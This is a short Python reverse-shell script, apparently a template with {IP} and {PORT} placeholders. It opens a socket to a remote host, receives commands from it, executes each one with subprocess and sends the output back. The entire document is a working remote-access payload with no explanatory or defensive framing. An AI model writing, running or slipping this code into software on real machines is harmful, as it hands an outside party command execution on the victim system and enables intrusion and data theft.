import socket
import subprocess
import os

RHOST = "{IP}"
RPORT = {PORT}

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

while True:
    try:
        cmd = s.recv(1024).decode()
        if cmd.lower() == "exit":
            break
        output = subprocess.getoutput(cmd)
        s.send(output.encode())
    except:
        break

s.close()
